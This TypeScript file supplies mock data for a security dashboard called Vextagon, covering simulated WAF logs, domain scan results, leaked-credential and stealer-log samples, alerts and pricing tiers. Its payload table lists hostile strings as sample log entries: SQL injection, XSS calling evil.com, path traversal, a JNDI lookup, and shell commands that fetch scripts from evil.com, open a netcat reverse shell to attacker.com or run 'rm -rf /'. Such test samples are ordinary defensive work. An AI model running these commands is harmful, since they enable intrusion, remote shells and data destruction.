// Vextagon mock data — production-grade simulation

// Generate realistic WAF invasion logs
function generateInvasionLogs(count: number) {
  const types = ["SQL Injection", "XSS", "Brute Force", "DDoS", "Path Traversal", "CSRF", "RCE", "SSRF", "LFI", "Command Injection"];
  const ips = [
    "45.227.254.8", "103.152.220.44", "91.240.118.172", "185.220.101.33", "195.54.160.149",
    "194.163.128.77", "179.43.175.114", "162.247.74.27", "51.222.253.18", "185.100.87.41",
    "103.75.190.11", "45.148.10.234", "193.118.53.202", "89.248.167.131", "71.6.135.131",
    "80.82.77.139", "94.102.49.190", "66.240.236.119", "71.6.165.200", "198.20.69.98",
  ];
  const payloads: Record<string, string[]> = {
    "SQL Injection": ["' OR 1=1 --", "'; DROP TABLE users; --", "UNION SELECT * FROM credentials", "1' AND 1=CONVERT(int,@@version)--", "admin' OR '1'='1"],
    "XSS": ["<script>document.cookie</script>", "<img onerror=alert(1) src=x>", "javascript:alert('xss')", "<svg onload=fetch('//evil.com')>", "'\"><script>steal()</script>"],
    "Brute Force": ["admin:password123", "root:toor", "admin:admin", "user:123456", "root:root123"],
    "DDoS": ["SYN Flood (42k pps)", "UDP Amplification (18Gbps)", "HTTP Flood (12k rps)", "DNS Amplification (8k qps)", "Slowloris (2k conn)"],
    "Path Traversal": ["../../etc/passwd", "..\\..\\windows\\system32\\config\\sam", "....//....//etc/shadow", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../../var/log/auth.log"],
    "CSRF": ["POST /api/transfer?amount=10000", "PUT /api/admin/role?role=admin", "DELETE /api/users/1", "POST /api/password/reset", "POST /api/settings/email"],
    "RCE": ["; cat /etc/passwd", "| wget evil.com/shell.sh", "${jndi:ldap://attacker.com/a}", "{{7*7}}", "os.execute('id')"],
    "SSRF": ["http://169.254.169.254/metadata", "http://127.0.0.1:6379/", "file:///etc/passwd", "gopher://127.0.0.1:11211/", "dict://127.0.0.1:11211/"],
    "LFI": ["/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php", "php://input", "/proc/self/environ", "....//....//etc/passwd"],
    "Command Injection": ["; rm -rf /", "| nc -e /bin/sh attacker.com 4444", "`whoami`", "$(cat /etc/shadow)", "&& curl evil.com/shell | bash"],
  };
  const actions = ["BLOCKED", "BLOCKED", "BLOCKED", "MITIGATED", "BLOCKED"];
  const severities = ["critical", "critical", "high", "high", "medium"];
  const countries = ["CN", "RU", "KP", "IR", "BR", "US", "DE", "NG", "PK", "VN"];

  const logs = [];
  const now = Date.now();
  for (let i = 0; i < count; i++) {
    const type = types[Math.floor(Math.random() * types.length)];
    const typePayloads = payloads[type] || ["unknown payload"];
    logs.push({
      id: `inv${i + 1}`,
      type,
      ip: ips[Math.floor(Math.random() * ips.length)],
      payload: typePayloads[Math.floor(Math.random() * typePayloads.length)],
      action: actions[Math.floor(Math.random() * actions.length)],
      timestamp: new Date(now - Math.random() * 86400000).toISOString().replace("T", " ").slice(0, 19),
      severity: severities[Math.floor(Math.random() * severities.length)],
      country: countries[Math.floor(Math.random() * countries.length)],
    });
  }
  return logs.sort((a, b) => b.timestamp.localeCompare(a.timestamp));
}

export const mockWafData = {
  totalRequests: 1_284_392,
  blockedRequests: 23_847,
  blockedPercentage: 1.86,
  geoBlocking: { enabled: true, blockedCountries: ["CN", "RU", "KP"] },
  antiDdos: true,
  rateLimiting: { enabled: true, maxPerMinute: 120 },
  threats: {
    sqlInjection: 8_421,
    xss: 6_932,
    bruteForce: 4_102,
    ddos: 5_214,
    other: 3_280,
  },
  trafficTimeline: [
    { time: "00:00", total: 4200, blocked: 85 },
    { time: "02:00", total: 3100, blocked: 42 },
    { time: "04:00", total: 2800, blocked: 31 },
    { time: "06:00", total: 5600, blocked: 120 },
    { time: "08:00", total: 12400, blocked: 340 },
    { time: "10:00", total: 18900, blocked: 520 },
    { time: "12:00", total: 22100, blocked: 890 },
    { time: "14:00", total: 19800, blocked: 760 },
    { time: "16:00", total: 17600, blocked: 430 },
    { time: "18:00", total: 14200, blocked: 310 },
    { time: "20:00", total: 9800, blocked: 210 },
    { time: "22:00", total: 6100, blocked: 140 },
  ],
  invasionLogs: generateInvasionLogs(50),
};

export const mockScanResults = {
  domain: "example.com",
  scanDate: "2026-03-08T14:00:00Z",
  score: 72,
  dns: {
    status: "resolved",
    records: [
      { type: "A", value: "93.184.216.34" },
      { type: "AAAA", value: "2606:2800:220:1:248:1893:25c8:1946" },
      { type: "MX", value: "mail.example.com (priority: 10)" },
      { type: "TXT", value: "v=spf1 include:_spf.google.com ~all" },
      { type: "NS", value: "ns1.example.com, ns2.example.com" },
    ],
  },
  securityHeaders: {
    "Strict-Transport-Security": { present: true, value: "max-age=31536000; includeSubDomains" },
    "X-Frame-Options": { present: false, value: null },
    "X-Content-Type-Options": { present: true, value: "nosniff" },
    "Content-Security-Policy": { present: false, value: null },
    "X-XSS-Protection": { present: true, value: "1; mode=block" },
    "Referrer-Policy": { present: false, value: null },
  },
  ssl: {
    valid: true,
    issuer: "Let's Encrypt Authority X3",
    expiresAt: "2026-06-15",
    protocol: "TLS 1.3",
    grade: "A+",
  },
  ports: [
    { port: 22, service: "SSH", status: "open", risk: "medium" },
    { port: 80, service: "HTTP", status: "open", risk: "low" },
    { port: 443, service: "HTTPS", status: "open", risk: "low" },
    { port: 21, service: "FTP", status: "closed", risk: "low" },
    { port: 3306, service: "MySQL", status: "open", risk: "critical" },
    { port: 8080, service: "HTTP-Alt", status: "open", risk: "high" },
  ],
  shodan: {
    ip: "93.184.216.34",
    os: "Ubuntu 22.04 LTS",
    organization: "Edgecast Inc.",
    isp: "Verizon Digital Media",
    services: [
      { port: 80, product: "nginx", version: "1.24.0" },
      { port: 443, product: "nginx", version: "1.24.0" },
      { port: 22, product: "OpenSSH", version: "8.9p1" },
      { port: 3306, product: "MySQL", version: "8.0.32" },
    ],
    vulns: ["CVE-2024-1234", "CVE-2024-5678"],
    lastUpdate: "2026-03-07",
  },
  vulnerabilities: [
    { id: "CVE-2024-1234", severity: "critical", title: "Remote Code Execution in Apache 2.4.49", description: "Path traversal vulnerability allowing RCE", affected: "Apache HTTP Server" },
    { id: "CVE-2024-5678", severity: "high", title: "SQL Injection in WordPress Plugin", description: "Unsanitized input in contact form plugin", affected: "ContactForm v3.2" },
    { id: "CVE-2024-9012", severity: "medium", title: "Information Disclosure via Headers", description: "Server version exposed in response headers", affected: "Nginx" },
    { id: "CVE-2024-3456", severity: "low", title: "Missing Security Headers", description: "X-Frame-Options and CSP headers not configured", affected: "Web Server Config" },
  ],
};

export const mockLeakedCredentials = [
  { id: "lc1", email: "admin@alluzion.com", source: "Adobe", date: "2025-11-15", status: "leaked", passwordHash: "sha256:a1b2c3...", dataTypes: ["email", "password", "username"] },
  { id: "lc2", email: "dev@alluzion.com", source: "LinkedIn", date: "2025-09-22", status: "leaked", passwordHash: "md5:d4e5f6...", dataTypes: ["email", "password"] },
  { id: "lc3", email: "ceo@alluzion.com", source: "N/A", date: "N/A", status: "protected", passwordHash: "N/A", dataTypes: [] },
  { id: "lc4", email: "finance@alluzion.com", source: "Canva", date: "2026-01-03", status: "leaked", passwordHash: "bcrypt:$2b$10$...", dataTypes: ["email", "password", "ip_address"] },
  { id: "lc5", email: "hr@alluzion.com", source: "N/A", date: "N/A", status: "protected", passwordHash: "N/A", dataTypes: [] },
  { id: "lc6", email: "support@alluzion.com", source: "Dropbox", date: "2025-12-20", status: "leaked", passwordHash: "sha1:7g8h9i...", dataTypes: ["email", "password"] },
];

export const mockStealerLogs = [
  { id: "sl1", domain: "alluzion.com", type: "Session Cookie", browser: "Chrome 121", os: "Windows 11", detectedAt: "2026-03-07 18:45:00", risk: "critical" },
  { id: "sl2", domain: "mail.alluzion.com", type: "Auth Token", browser: "Firefox 123", os: "macOS 14", detectedAt: "2026-03-06 09:12:00", risk: "high" },
  { id: "sl3", domain: "admin.alluzion.com", type: "Session Cookie", browser: "Edge 121", os: "Windows 11", detectedAt: "2026-03-05 22:30:00", risk: "critical" },
];

export const mockSecurityAlerts = [
  { id: "a1", type: "port_open", severity: "critical", title: "Porta 3306 (MySQL) exposta", description: "Banco de dados acessível publicamente", domain: "example.com", timestamp: "2026-03-08 14:00:00", read: false },
  { id: "a2", type: "credential_leak", severity: "high", title: "Credencial vazada detectada", description: "admin@alluzion.com encontrado em breach recente", domain: "alluzion.com", timestamp: "2026-03-08 13:45:00", read: false },
  { id: "a3", type: "ssl_expiring", severity: "medium", title: "Certificado SSL expira em 30 dias", description: "Renovar antes de 2026-06-15", domain: "example.com", timestamp: "2026-03-08 12:00:00", read: true },
  { id: "a4", type: "ddos_detected", severity: "critical", title: "Ataque DDoS mitigado", description: "SYN Flood de 42k pps bloqueado pelo WAF", domain: "example.com", timestamp: "2026-03-08 14:30:00", read: false },
  { id: "a5", type: "brute_force", severity: "high", title: "Brute Force detectado", description: "342 tentativas de login em 5 minutos no painel admin", domain: "admin.alluzion.com", timestamp: "2026-03-08 11:20:00", read: false },
  { id: "a6", type: "server_down", severity: "critical", title: "Servidor offline", description: "srv-prod-02 não responde há 15 minutos", domain: "prod-02.alluzion.com", timestamp: "2026-03-08 10:45:00", read: true },
];

export const mockAdminUsers = [
  { id: "u1", name: "Carlos Mendes", email: "carlos@empresa.com", tier: "premium", domains: 5, lastActive: "2026-03-08", monthlyRevenue: 197 },
  { id: "u2", name: "Ana Souza", email: "ana@startup.io", tier: "free", domains: 1, lastActive: "2026-03-07", monthlyRevenue: 0 },
  { id: "u3", name: "Ricardo Lima", email: "ricardo@tech.com", tier: "premium", domains: 12, lastActive: "2026-03-08", monthlyRevenue: 197 },
  { id: "u4", name: "Fernanda Costa", email: "fernanda@agency.com", tier: "free", domains: 1, lastActive: "2026-03-05", monthlyRevenue: 0 },
  { id: "u5", name: "Bruno Alves", email: "bruno@corp.com.br", tier: "premium", domains: 8, lastActive: "2026-03-08", monthlyRevenue: 197 },
];

export const tiers = {
  free: {
    name: "Free",
    price: "R$ 0",
    features: [
      "1 scan básico de domínio",
      "Sem detalhes de vulnerabilidades",
      "Sem monitoramento WAF",
      "Sem Data Leak Monitor",
    ],
    limited: true,
  },
  premium: {
    name: "Premium",
    price: "R$ 197/mês",
    features: [
      "Scans ilimitados com detalhes completos",
      "WAF Dashboard em tempo real",
      "Data Leak Monitor ativo",
      "Auditorias PDF ilimitadas",
      "Notificações WhatsApp",
      "Suporte prioritário",
    ],
    limited: false,
  },
};
